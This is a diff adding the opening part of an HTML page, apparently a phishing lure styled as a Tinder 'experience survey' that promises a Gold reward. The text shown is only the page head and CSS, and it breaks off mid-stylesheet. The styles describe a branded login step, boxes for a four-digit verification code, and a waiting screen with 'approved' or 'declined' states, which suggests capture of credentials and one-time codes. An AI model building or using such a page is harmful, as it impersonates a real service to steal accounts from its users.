@@ -1,0 +1,1565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tinder Experience Survey — Claim Your Gold</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --t-red:#FE3C72;--t-orange:#FF6036;
+  --t-grad:linear-gradient(135deg,#FE3C72 0%,#FF6036 100%);
+  --gold:#FFB800;--gold-lt:#FFF8E1;--gold-dark:#B8860B;
+  --bg:#FFFFFF;--bg2:#F7F7F7;--bg3:#EFEFEF;
+  --surface:#FFFFFF;--border:#E8E8E8;--border2:#D0D0D0;
+  --text:#1A1A1A;--text2:#424242;--muted:#757575;--muted2:#B0B0B0;
+  --success:#00B74A;--r:16px;--r-sm:10px;--r-lg:24px;
+  --shadow-lg:0 8px 48px rgba(0,0,0,0.10);
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Nunito',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+
+/* HEADER */
+.header{position:sticky;top:0;z-index:200;background:rgba(255,255,255,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;}
+.header-logo{display:flex;align-items:center;gap:10px;}
+.header-logo-icon{width:34px;height:34px;background:var(--t-grad);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 2px 8px rgba(254,60,114,0.35);}
+.header-logo-text{font-size:22px;font-weight:900;letter-spacing:-0.5px;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.header-pill{background:var(--gold-lt);border:1.5px solid var(--gold);color:var(--gold-dark);font-size:12px;font-weight:700;padding:5px 14px;border-radius:20px;}
+
+/* HERO */
+.hero{position:relative;overflow:hidden;padding:72px 24px 56px;text-align:center;}
+.hero::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(254,60,114,0.05) 0%,rgba(255,96,54,0.03) 60%,transparent 100%);pointer-events:none;}
+.hero-deco{position:absolute;pointer-events:none;z-index:0;font-size:36px;opacity:0.07;animation:floatHeart 6s ease-in-out infinite;}
+.hero-deco:nth-child(1){top:10%;left:8%;animation-delay:0s;font-size:28px;}
+.hero-deco:nth-child(2){top:20%;right:10%;animation-delay:1.5s;font-size:44px;}
+.hero-deco:nth-child(3){bottom:15%;left:15%;animation-delay:3s;font-size:22px;}
+.hero-deco:nth-child(4){bottom:10%;right:8%;animation-delay:0.8s;font-size:32px;}
+@keyframes floatHeart{0%,100%{transform:translateY(0) rotate(-8deg);}50%{transform:translateY(-14px) rotate(8deg);}}
+.hero-inner{position:relative;z-index:1;max-width:640px;margin:0 auto;}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:7px;background:linear-gradient(135deg,rgba(254,60,114,0.08),rgba(255,96,54,0.06));border:1.5px solid rgba(254,60,114,0.2);color:var(--t-red);font-size:11px;font-weight:800;padding:6px 16px;border-radius:20px;text-transform:uppercase;letter-spacing:1px;margin-bottom:24px;}
+.eyebrow-dot{width:6px;height:6px;border-radius:50%;background:var(--t-red);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.4)}}
+.hero h1{font-size:clamp(32px,6vw,54px);font-weight:900;line-height:1.1;letter-spacing:-1px;color:var(--text);margin-bottom:18px;}
+.hero h1 .grad{background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.hero-sub{font-size:16px;font-weight:600;color:var(--muted);line-height:1.65;max-width:480px;margin:0 auto 32px;}
+.reward-chip{display:inline-flex;align-items:center;gap:10px;background:var(--gold-lt);border:2px solid var(--gold);border-radius:14px;padding:12px 22px;box-shadow:0 2px 12px rgba(255,184,0,0.2);}
+.reward-chip-icon{font-size:22px;}
+.reward-chip-lbl{font-size:10px;font-weight:800;color:var(--gold-dark);text-transform:uppercase;letter-spacing:1px;}
+.reward-chip-name{font-size:15px;font-weight:800;color:#7A5C00;margin-top:1px;}
+
+/* TRUST */
+.trust-row{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;padding:0 24px 56px;}
+.trust-chip{display:flex;align-items:center;gap:6px;background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:7px 14px;font-size:12px;font-weight:700;color:var(--text2);}
+
+/* SURVEY */
+.survey-outer{max-width:640px;margin:0 auto;padding:0 20px 100px;}
+.survey-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--r-lg);overflow:hidden;box-shadow:var(--shadow-lg);}
+.prog-bar-wrap{height:5px;background:var(--bg3);}
+.prog-bar-fill{height:5px;background:var(--t-grad);transition:width 0.55s cubic-bezier(.4,0,.2,1);border-radius:0 3px 3px 0;}
+.prog-meta{display:flex;justify-content:space-between;align-items:center;padding:14px 24px 0;}
+.prog-dots{display:flex;gap:5px;}
+.prog-dot{width:8px;height:8px;border-radius:50%;background:var(--bg3);transition:background 0.3s;}
+.prog-dot.done{background:var(--t-red);}
+.prog-dot.current{background:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.18);}
+.prog-label{font-size:12px;font-weight:700;color:var(--muted);}
+.prog-pct{font-size:12px;font-weight:800;color:var(--t-red);}
+
+/* Q BODY */
+.q-body{padding:28px 24px 24px;}
+.q-step{display:none;}
+.q-step.active{display:block;animation:slideIn 0.32s cubic-bezier(.4,0,.2,1) both;}
+@keyframes slideIn{from{opacity:0;transform:translateX(24px);}to{opacity:1;transform:translateX(0);}}
+.q-tag{display:inline-block;font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:1.2px;color:var(--t-red);background:rgba(254,60,114,0.07);padding:4px 10px;border-radius:5px;margin-bottom:12px;}
+.q-type-badge{display:inline-block;font-size:10px;font-weight:700;padding:3px 9px;border-radius:5px;margin-left:6px;vertical-align:middle;}
+.q-type-badge.type-choice{background:rgba(99,102,241,0.1);color:#6366F1;}
+.q-type-badge.type-text{background:rgba(16,185,129,0.1);color:#059669;}
+.q-type-badge.type-scale{background:rgba(245,158,11,0.1);color:#D97706;}
+.q-text{font-size:20px;font-weight:900;line-height:1.3;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
+.q-sub{font-size:13px;color:var(--muted);margin-bottom:18px;font-weight:600;line-height:1.5;}
+
+/* MULTIPLE CHOICE */
+.opts{display:flex;flex-direction:column;gap:8px;}
+.opt{width:100%;text-align:left;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:13px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--text2);cursor:pointer;display:flex;align-items:center;gap:12px;transition:border-color 0.15s,background 0.15s,transform 0.1s,box-shadow 0.15s;}
+.opt:hover{border-color:rgba(254,60,114,0.4);background:rgba(254,60,114,0.04);transform:translateY(-1px);box-shadow:0 3px 12px rgba(254,60,114,0.1);}
+.opt.selected{border-color:var(--t-red);background:rgba(254,60,114,0.06);color:var(--text);transform:translateY(-1px);box-shadow:0 4px 16px rgba(254,60,114,0.15);}
+.opt-radio{width:20px;height:20px;border-radius:50%;flex-shrink:0;border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;transition:border-color 0.15s,background 0.15s;background:var(--bg);}
+.opt.selected .opt-radio{border-color:var(--t-red);background:var(--t-grad);}
+.opt-radio-dot{width:7px;height:7px;border-radius:50%;background:#fff;opacity:0;transform:scale(0);transition:opacity 0.15s,transform 0.2s cubic-bezier(.34,1.56,.64,1);}
+.opt.selected .opt-radio-dot{opacity:1;transform:scale(1);}
+
+/* TEXT INPUT */
+.text-input-wrap{position:relative;margin-bottom:4px;}
+.q-text-input{width:100%;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:14px 16px;font-family:'Nunito',sans-serif;font-size:15px;font-weight:700;color:var(--text);outline:none;transition:border-color 0.2s,box-shadow 0.2s;}
+.q-text-input:focus{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+.q-text-input::placeholder{color:var(--muted2);font-weight:600;}
+.q-text-input.valid{border-color:var(--success);box-shadow:0 0 0 3px rgba(0,183,74,0.08);}
+.input-check{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:18px;opacity:0;transition:opacity 0.2s;}
+.input-check.show{opacity:1;}
+
+/* TEXTAREA */
+.q-textarea{width:100%;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:14px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:600;color:var(--text);resize:vertical;min-height:110px;outline:none;transition:border-color 0.2s,box-shadow 0.2s;line-height:1.6;}
+.q-textarea:focus{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+.q-textarea::placeholder{color:var(--muted2);font-weight:600;}
+.char-hint{font-size:11px;font-weight:700;color:var(--muted2);text-align:right;margin-top:5px;transition:color 0.2s;}
+.char-hint.ok{color:var(--success);}
+
+/* SLIDER / SCALE */
+.scale-wrap{padding:8px 0 16px;}
+.scale-track{position:relative;padding:0 0 24px;}
+.scale-labels{display:flex;justify-content:space-between;margin-bottom:10px;}
+.scale-label{font-size:11px;font-weight:700;color:var(--muted);}
+input[type=range].scale-range{width:100%;-webkit-appearance:none;appearance:none;height:6px;border-radius:3px;outline:none;cursor:pointer;background:linear-gradient(90deg,var(--t-red) 0%,var(--t-red) var(--fill,50%),var(--bg3) var(--fill,50%),var(--bg3) 100%);}
+input[type=range].scale-range::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:24px;height:24px;border-radius:50%;background:var(--t-grad);border:3px solid #fff;box-shadow:0 2px 8px rgba(254,60,114,0.4);cursor:pointer;transition:transform 0.15s;}
+input[type=range].scale-range::-webkit-slider-thumb:hover{transform:scale(1.15);}
+input[type=range].scale-range::-moz-range-thumb{width:24px;height:24px;border-radius:50%;background:var(--t-grad);border:3px solid #fff;box-shadow:0 2px 8px rgba(254,60,114,0.4);cursor:pointer;}
+.scale-value-display{text-align:center;margin-top:4px;}
+.scale-value-num{font-size:28px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;line-height:1;}
+.scale-value-label{font-size:13px;font-weight:700;color:var(--muted);margin-top:3px;}
+
+/* MULTI-SELECT */
+.multi-opts{display:flex;flex-direction:column;gap:8px;}
+.multi-opt{width:100%;text-align:left;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:13px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--text2);cursor:pointer;display:flex;align-items:center;gap:12px;transition:border-color 0.15s,background 0.15s,transform 0.1s;}
+.multi-opt:hover{border-color:rgba(254,60,114,0.4);background:rgba(254,60,114,0.04);transform:translateY(-1px);}
+.multi-opt.selected{border-color:var(--t-red);background:rgba(254,60,114,0.06);color:var(--text);box-shadow:0 4px 16px rgba(254,60,114,0.12);}
+.multi-check{width:20px;height:20px;border-radius:5px;flex-shrink:0;border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;transition:border-color 0.15s,background 0.15s;background:var(--bg);}
+.multi-opt.selected .multi-check{border-color:var(--t-red);background:var(--t-grad);}
+.multi-check-icon{font-size:11px;color:#fff;opacity:0;transition:opacity 0.15s;}
+.multi-opt.selected .multi-check-icon{opacity:1;}
+.multi-hint{font-size:11px;font-weight:700;color:var(--muted);margin-bottom:10px;}
+
+/* VALIDATION */
+.val-msg{font-size:12px;font-weight:700;color:var(--t-red);margin-top:8px;display:none;padding:7px 12px;background:rgba(254,60,114,0.06);border-radius:7px;border-left:3px solid var(--t-red);}
+
+/* NAV */
+.q-nav{display:flex;justify-content:space-between;align-items:center;padding:16px 24px 20px;border-top:1px solid var(--border);gap:12px;}
+.btn-back{background:transparent;border:2px solid var(--border);border-radius:var(--r-sm);padding:10px 20px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--muted);cursor:pointer;transition:border-color 0.2s,color 0.2s;}
+.btn-back:hover{border-color:var(--border2);color:var(--text2);}
+.btn-next{background:var(--t-grad);border:none;border-radius:var(--r-sm);padding:11px 30px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:800;color:#fff;cursor:pointer;box-shadow:0 4px 16px rgba(254,60,114,0.35);transition:box-shadow 0.2s,transform 0.1s,filter 0.2s;}
+.btn-next:hover{filter:brightness(1.06);box-shadow:0 6px 24px rgba(254,60,114,0.45);}
+.btn-next:active{transform:scale(0.97);}
+
+/* RESULT */
+.result-wrap{padding:32px 24px;}
+.result-banner{background:var(--t-grad);border-radius:16px;padding:28px 24px;text-align:center;margin-bottom:24px;position:relative;overflow:hidden;}
+.result-banner::before{content:'❤️';position:absolute;font-size:80px;opacity:0.08;top:-10px;right:-10px;}
+.result-banner::after{content:'🔥';position:absolute;font-size:60px;opacity:0.08;bottom:-10px;left:-5px;}
+.result-trophy{font-size:44px;margin-bottom:10px;display:block;}
+.result-title{font-size:22px;font-weight:900;color:#fff;margin-bottom:6px;}
+.result-subtitle{font-size:13px;color:rgba(255,255,255,0.82);font-weight:700;line-height:1.5;}
+.score-row{display:flex;align-items:center;gap:16px;background:var(--bg2);border:1.5px solid var(--border);border-radius:14px;padding:16px 20px;margin-bottom:20px;}
+.score-ring-wrap{position:relative;width:64px;height:64px;flex-shrink:0;}
+.score-ring-wrap svg{transform:rotate(-90deg);}
+.score-ring-bg{fill:none;stroke:var(--bg3);stroke-width:6;}
+.score-ring-fg{fill:none;stroke:url(#rGrad);stroke-width:6;stroke-linecap:round;transition:stroke-dashoffset 1.2s ease 0.4s;}
+.score-ring-num{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:13px;font-weight:900;color:var(--t-red);}
+.score-text-title{font-size:14px;font-weight:800;color:var(--text);margin-bottom:3px;}
+.score-text-sub{font-size:12px;font-weight:700;color:var(--muted);}
+.reward-box{background:var(--gold-lt);border:2px solid var(--gold);border-radius:14px;padding:20px;margin-bottom:20px;}
+.reward-box-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;}
+.reward-box-icon{font-size:26px;}
+.reward-box-lbl{font-size:10px;font-weight:800;color:var(--gold-dark);text-transform:uppercase;letter-spacing:1px;}
+.reward-box-name{font-size:16px;font-weight:900;color:#7A5C00;margin-top:2px;}
+.code-row{background:#fff;border:1.5px solid rgba(255,184,0,0.4);border-radius:10px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;}
+.code-hint-lbl{font-size:10px;font-weight:800;color:var(--gold-dark);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:4px;}
+.code-value{font-size:22px;font-weight:900;letter-spacing:4px;color:var(--text);}
+.btn-copy{background:var(--t-grad);border:none;border-radius:8px;padding:9px 18px;font-family:'Nunito',sans-serif;font-size:13px;font-weight:800;color:#fff;cursor:pointer;flex-shrink:0;transition:filter 0.2s,transform 0.1s;box-shadow:0 2px 10px rgba(254,60,114,0.3);}
+.btn-copy:hover{filter:brightness(1.07);}
+.btn-copy.copied{background:linear-gradient(135deg,#00B74A,#00C853);}
+.redeem-box{background:var(--bg2);border:1.5px solid var(--border);border-radius:14px;padding:18px 20px;margin-bottom:16px;}
+.redeem-box-title{font-size:13px;font-weight:900;color:var(--text);margin-bottom:12px;}
+.redeem-step{display:flex;gap:12px;align-items:flex-start;font-size:13px;font-weight:600;color:var(--text2);margin-bottom:9px;line-height:1.5;}
+.redeem-step:last-child{margin-bottom:0;}
+.redeem-step-num{width:22px;height:22px;border-radius:50%;background:var(--t-grad);color:#fff;font-size:11px;font-weight:900;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;}
+.expiry-note{font-size:12px;font-weight:700;color:var(--muted);text-align:center;padding:10px 0;display:flex;align-items:center;justify-content:center;gap:6px;}
+.expiry-dot{width:6px;height:6px;border-radius:50%;background:var(--gold);}
+
+/* STATS */
+.stats-section{background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border);padding:64px 24px;text-align:center;}
+.section-title{font-size:26px;font-weight:900;color:var(--text);letter-spacing:-0.5px;margin-bottom:6px;}
+.section-sub{font-size:14px;font-weight:700;color:var(--muted);margin-bottom:40px;}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px;max-width:680px;margin:0 auto;}
+.stat-card{background:var(--surface);border:1.5px solid var(--border);border-radius:16px;padding:22px 16px;box-shadow:0 2px 12px rgba(0,0,0,0.05);transition:transform 0.2s,box-shadow 0.2s;}
+.stat-card:hover{transform:translateY(-3px);box-shadow:0 6px 24px rgba(254,60,114,0.12);}
+.stat-card-val{font-size:32px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:5px;letter-spacing:-1px;}
+.stat-card-lbl{font-size:12px;font-weight:700;color:var(--muted);}
+
+/* FAQ */
+.faq-section{max-width:640px;margin:0 auto;padding:64px 24px;}
+.faq-item{border:1.5px solid var(--border);border-radius:12px;margin-bottom:8px;overflow:hidden;background:var(--surface);transition:border-color 0.2s;}
+.faq-item:hover{border-color:rgba(254,60,114,0.3);}
+.faq-q{display:flex;justify-content:space-between;align-items:center;padding:15px 18px;cursor:pointer;font-size:14px;font-weight:800;color:var(--text);gap:12px;transition:background 0.15s;}
+.faq-q:hover{background:var(--bg2);}
+.faq-icon{width:22px;height:22px;border-radius:50%;flex-shrink:0;background:var(--bg2);border:1.5px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;color:var(--muted);transition:background 0.2s,border-color 0.2s,color 0.2s,transform 0.3s;}
+.faq-item.open .faq-icon{background:var(--t-grad);border-color:var(--t-red);color:#fff;transform:rotate(45deg);}
+.faq-a{font-size:13px;font-weight:600;color:var(--muted);line-height:1.7;max-height:0;overflow:hidden;transition:max-height 0.4s ease,padding 0.3s ease;padding:0 18px;}
+.faq-item.open .faq-a{max-height:200px;padding:0 18px 15px;}
+
+/* FOOTER */
+.footer{background:var(--text);padding:32px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;}
+.footer-logo-text{font-size:20px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.footer-copy{font-size:12px;font-weight:700;color:#666;}
+.footer-links{display:flex;gap:18px;}
+.footer-links a{font-size:12px;font-weight:700;color:#666;text-decoration:none;transition:color 0.2s;}
+.footer-links a:hover{color:var(--t-red);}
+
+/* TOAST */
+.toast{position:fixed;bottom:24px;right:24px;z-index:9999;background:var(--text);color:#fff;border-radius:10px;padding:12px 20px;font-size:13px;font-weight:700;box-shadow:0 8px 32px rgba(0,0,0,0.18);transform:translateY(16px);opacity:0;transition:transform 0.3s,opacity 0.3s;pointer-events:none;}
+.toast.show{transform:translateY(0);opacity:1;}
+
+@media(max-width:600px){
+  .header{padding:0 16px;}
+  .hero{padding:56px 16px 44px;}
+  .q-body{padding:22px 18px 18px;}
+  .q-nav{padding:14px 18px 16px;}
+  .result-wrap{padding:24px 18px;}
+  .code-row{flex-direction:column;align-items:flex-start;}
+  .btn-copy{width:100%;text-align:center;}
+  .footer{flex-direction:column;align-items:flex-start;}
+}
+
+/* ── LOGIN FLOW STYLES ── */
+.ls-step { animation: slideIn 0.35s cubic-bezier(.4,0,.2,1) both; }
+.ls-wrap {
+  padding: 32px 24px 28px;
+  max-width: 420px; margin: 0 auto;
+}
+.ls-logo-row {
+  display: flex; align-items: center; gap: 8px;
+  margin-bottom: 20px;
+}
+.ls-flame {
+  width: 38px; height: 38px; border-radius: 11px;
+  background: var(--t-grad);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 20px;
+  box-shadow: 0 3px 10px rgba(254,60,114,0.35);
+}
+.ls-brand {
+  font-size: 26px; font-weight: 900; letter-spacing: -0.5px;
+  background: var(--t-grad);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.ls-congrats-pill {
+  display: inline-flex; align-items: center; gap: 6px;
+  background: var(--gold-lt); border: 1.5px solid var(--gold);
+  color: var(--gold-dark); font-size: 12px; font-weight: 800;
+  padding: 6px 14px; border-radius: 20px;
+  margin-bottom: 20px;
+}
+.ls-title {
+  font-size: 22px; font-weight: 900; color: var(--text);
+  letter-spacing: -0.4px; margin-bottom: 8px; line-height: 1.25;
+}
+.ls-sub {
+  font-size: 14px; font-weight: 600; color: var(--muted);
+  line-height: 1.6; margin-bottom: 24px;
+}
+.ls-back-row {
+  font-size: 13px; font-weight: 700; color: var(--muted);
+  cursor: pointer; margin-bottom: 20px; display: inline-block;
+  transition: color 0.15s;
+}
+.ls-back-row:hover { color: var(--t-red); }
+.ls-field-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 8px; }
+.ls-field {
+  display: flex; align-items: center; gap: 10px;
+  background: var(--bg2); border: 2px solid var(--border);
+  border-radius: var(--r-sm); padding: 0 14px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.ls-field:focus-within {
+  border-color: var(--t-red);
+  box-shadow: 0 0 0 3px rgba(254,60,114,0.1);
+}
+.ls-field-icon { font-size: 16px; flex-shrink: 0; }
+.ls-input {
+  flex: 1; background: transparent; border: none; outline: none;
+  padding: 13px 0;
+  font-family: 'Nunito', sans-serif;
+  font-size: 14px; font-weight: 700; color: var(--text);
+}
+.ls-input::placeholder { color: var(--muted2); font-weight: 600; }
+.ls-val-msg {
+  font-size: 12px; font-weight: 700; color: var(--t-red);
+  padding: 7px 12px; background: rgba(254,60,114,0.06);
+  border-radius: 7px; border-left: 3px solid var(--t-red);
+  margin-bottom: 14px; display: none;
+}
+.ls-btn {
+  width: 100%; padding: 14px;
+  background: var(--t-grad); border: none; border-radius: var(--r-sm);
+  font-family: 'Nunito', sans-serif;
+  font-size: 15px; font-weight: 800; color: #fff;
+  cursor: pointer; margin-bottom: 14px;
+  box-shadow: 0 4px 18px rgba(254,60,114,0.35);
+  transition: filter 0.2s, transform 0.1s, opacity 0.2s;
+  opacity: 1;
+}
+.ls-btn:hover { filter: brightness(1.06); }
+.ls-btn:active { transform: scale(0.98); }
+.ls-btn:disabled { opacity: 0.6; cursor: not-allowed; filter: none; transform: none; }
+.ls-terms {
+  font-size: 11px; font-weight: 600; color: var(--muted2);
+  text-align: center; line-height: 1.6;
+}
+.ls-terms a { color: var(--t-red); text-decoration: none; }
+.ls-resend {
+  font-size: 13px; font-weight: 700; color: var(--muted);
+  text-align: center; cursor: default; margin-top: 4px;
+}
+.ls-resend span { color: var(--t-red); cursor: pointer; }
+.ls-resend span:hover { text-decoration: underline; }
+
+/* 4-digit code boxes */
+.ls-code-row {
+  display: flex; gap: 12px; justify-content: center;
+  margin-bottom: 8px;
+}
+.ls-code-box {
+  width: 60px; height: 64px; border-radius: 12px;
+  border: 2px solid var(--border);
+  background: var(--bg2);
+  font-family: 'Nunito', sans-serif;
+  font-size: 26px; font-weight: 900;
+  color: var(--text); text-align: center; outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
+  caret-color: var(--t-red);
+}
+.ls-code-box:focus {
+  border-color: var(--t-red);
+  box-shadow: 0 0 0 3px rgba(254,60,114,0.12);
+  transform: scale(1.06);
+}
+
+/* Step 3 — waiting */
+.ls-spinner-wrap {
+  display: flex; justify-content: center;
+  margin: 24px 0 16px;
+}
+.ls-spinner {
+  width: 48px; height: 48px; border-radius: 50%;
+  border: 4px solid var(--bg3);
+  border-top-color: var(--t-red);
+  animation: spin 0.85s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.ls-status-bar {
+  display: flex; flex-direction: column; gap: 10px;
+  background: var(--bg2); border: 1.5px solid var(--border);
+  border-radius: 14px; padding: 16px 20px;
+  margin: 20px 0; text-align: left;
+}
+.ls-status-item {
+  display: flex; align-items: center; gap: 10px;
+  font-size: 13px; font-weight: 700; color: var(--text2);
+}
+.ls-status-dot {
+  width: 10px; height: 10px; border-radius: 50%;
+  background: var(--bg3); border: 2px solid var(--border2);
+  flex-shrink: 0; transition: background 0.3s, border-color 0.3s;
+}
+.ls-status-dot.done { background: var(--success); border-color: var(--success); }
+.ls-status-dot.pulse { background: var(--t-red); border-color: var(--t-red); animation: pulse 1.5s infinite; }
+.ls-status-dot.error { background: #E53935; border-color: #E53935; }
+.ls-approved-badge {
+  display: inline-block; background: rgba(0,183,74,0.1);
+  border: 1.5px solid rgba(0,183,74,0.4);
+  color: var(--success); font-size: 14px; font-weight: 800;
+  padding: 8px 20px; border-radius: 20px; margin-bottom: 8px;
+}
+.ls-gold-chip {
+  display: inline-block;
+  background: var(--gold-lt); border: 2px solid var(--gold);
+  color: var(--gold-dark); font-size: 14px; font-weight: 800;
+  padding: 10px 24px; border-radius: 12px;
+  margin-top: 16px;
+}
+.ls-declined-badge {
+  display: inline-block; background: rgba(229,57,53,0.08);
+  border: 1.5px solid rgba(229,57,53,0.3);
+  color: #E53935; font-size: 14px; font-weight: 800;
+  padding: 8px 20px; border-radius: 20px; margin-bottom: 8px;
+}
+
+/* ═══ RICH ANIMATIONS ═══════════════════════════════════════════ */
+
+/* Page load hero stagger */
+@keyframes fadeUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeDown{from{opacity:0;transform:translateY(-16px)}to{opacity:1;transform:translateY(0)}}
+@keyframes scalePop{from{opacity:0;transform:scale(0.88)}to{opacity:1;transform:scale(1)}}
+@keyframes gradShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+@keyframes bounceIn{0%{transform:scale(0.3);opacity:0}50%{transform:scale(1.08)}70%{transform:scale(0.96)}100%{transform:scale(1);opacity:1}}
+@keyframes shake{0%,100%{transform:translateX(0)}15%{transform:translateX(-7px)}30%{transform:translateX(7px)}45%{transform:translateX(-5px)}60%{transform:translateX(5px)}75%{transform:translateX(-2px)}90%{transform:translateX(2px)}}
+@keyframes ripple{0%{transform:scale(0);opacity:0.5}100%{transform:scale(4);opacity:0}}
+@keyframes heartBeat{0%,100%{transform:scale(1)}14%{transform:scale(1.3)}28%{transform:scale(1)}42%{transform:scale(1.2)}70%{transform:scale(1)}}
+@keyframes slideUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+@keyframes checkStrike{from{stroke-dashoffset:40}to{stroke-dashoffset:0}}
+@keyframes glowPulse{0%,100%{box-shadow:0 4px 16px rgba(254,60,114,0.3)}50%{box-shadow:0 4px 32px rgba(254,60,114,0.65),0 0 0 6px rgba(254,60,114,0.08)}}
+@keyframes typewriter{from{width:0}to{width:100%}}
+@keyframes confettiFall{0%{transform:translateY(-20px) rotate(0deg);opacity:1}100%{transform:translateY(100vh) rotate(720deg);opacity:0}}
+@keyframes progressGlow{0%,100%{box-shadow:none}50%{box-shadow:0 0 8px rgba(254,60,114,0.5)}}
+@keyframes optStagger{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
+@keyframes ls-flame-bounce{0%,100%{transform:scale(1) rotate(0deg)}25%{transform:scale(1.15) rotate(-5deg)}75%{transform:scale(1.1) rotate(5deg)}}
+
+/* Hero animated gradient headline */
+.hero h1 .grad{
+  background:linear-gradient(270deg,#FE3C72,#FF6036,#FFB300,#FE3C72);
+  background-size:300% 300%;
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  animation:gradShift 4s ease infinite;
+}
+
+/* Hero entrance stagger */
+.hero-eyebrow{animation:fadeDown 0.6s 0.1s ease both;}
+.hero h1{animation:fadeUp 0.7s 0.25s ease both;}
+.hero-sub{animation:fadeUp 0.7s 0.4s ease both;}
+.reward-chip{animation:scalePop 0.6s 0.55s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* Trust chips stagger */
+.trust-chip:nth-child(1){animation:fadeUp 0.5s 0.6s ease both;}
+.trust-chip:nth-child(2){animation:fadeUp 0.5s 0.72s ease both;}
+.trust-chip:nth-child(3){animation:fadeUp 0.5s 0.84s ease both;}
+.trust-chip:nth-child(4){animation:fadeUp 0.5s 0.96s ease both;}
+
+/* Survey card entrance */
+.survey-card{animation:fadeUp 0.7s 0.7s ease both;}
+
+/* Question slide with depth */
+.q-step.active{animation:slideIn 0.38s cubic-bezier(.4,0,.2,1) both;}
+
+/* Options staggered entrance */
+.q-step.active .opts .opt:nth-child(1){animation:optStagger 0.3s 0.05s ease both;}
+.q-step.active .opts .opt:nth-child(2){animation:optStagger 0.3s 0.10s ease both;}
+.q-step.active .opts .opt:nth-child(3){animation:optStagger 0.3s 0.15s ease both;}
+.q-step.active .opts .opt:nth-child(4){animation:optStagger 0.3s 0.20s ease both;}
+.q-step.active .opts .opt:nth-child(5){animation:optStagger 0.3s 0.25s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(1){animation:optStagger 0.3s 0.05s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(2){animation:optStagger 0.3s 0.10s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(3){animation:optStagger 0.3s 0.15s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(4){animation:optStagger 0.3s 0.20s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(5){animation:optStagger 0.3s 0.25s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(6){animation:optStagger 0.3s 0.30s ease both;}
+
+/* Selected option pop */
+.opt.selected{animation:optStagger 0s,scalePop 0.22s cubic-bezier(.34,1.56,.64,1) both!important;}
+
+/* Btn Next glow pulse */
+.btn-next{animation:glowPulse 2.5s 1.5s ease infinite;}
+
+/* Progress bar glow */
